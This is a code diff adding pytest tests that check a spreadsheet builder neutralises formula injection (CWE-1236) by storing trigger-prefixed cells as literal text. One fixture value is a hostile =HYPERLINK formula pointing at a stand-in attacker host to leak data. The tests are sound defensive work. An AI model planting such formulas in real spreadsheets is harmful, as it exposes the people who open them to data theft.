@@ -14,6 +14,7 @@ Guards:
 import os
 import zipfile
 
+import openpyxl
 import pytest
 
 from src.pipeline.file_structurer import _extract_json, _normalize_payload
@@ -150,4 +151,47 @@ def test_ooxml_files_are_valid_zip_archives(build, hostile_payload):
 def test_builders_survive_a_payload_with_no_sections():
     filepath, size = build_pdf(_normalize_payload({"title": "Empty"}))
     assert size > 0
+    os.remove(filepath)
+
+
+# ── CWE-1236 formula/CSV injection ───────────────────────────────────────────
+
+def test_xlsx_neutralizes_formula_injection_in_cells_and_headers():
+    """A cell starting with =/+/-/@ is a live formula the instant Excel opens
+    the file — evidence/LLM-supplied text must never reach openpyxl as-is."""
+    payload = _normalize_payload({
+        "title": "T",
+        "sections": [{
+            "type": "table",
+            "headers": ["=1+1", "Normal"],
+            "rows": [['=HYPERLINK("http://attacker/leak","Click")', "+SUM(A1:A9)"]],
+        }],
+    })
+    filepath, _ = build_xlsx(payload)
+    wb = openpyxl.load_workbook(filepath)
+    ws = wb.active
+
+    # Every cell that started with a formula-trigger character must be
+    # stored as literal text (leading apostrophe), never as a live formula.
+    assert ws["A1"].value == "'=1+1"
+    assert ws["A1"].data_type == "s"
+    assert ws["A2"].value == '\'=HYPERLINK("http://attacker/leak","Click")'
+    assert ws["A2"].data_type == "s"
+    assert ws["B2"].value == "'+SUM(A1:A9)"
+    assert ws["B2"].data_type == "s"
+
+    os.remove(filepath)
+
+
+def test_xlsx_leaves_ordinary_cells_untouched():
+    payload = _normalize_payload({
+        "title": "T",
+        "sections": [{"type": "table", "headers": ["Section", "Punishment"],
+                      "rows": [["379", "3 years"]]}],
+    })
+    filepath, _ = build_xlsx(payload)
+    wb = openpyxl.load_workbook(filepath)
+    ws = wb.active
+    assert ws["A2"].value == "379"
+    assert ws["B2"].value == "3 years"
     os.remove(filepath)
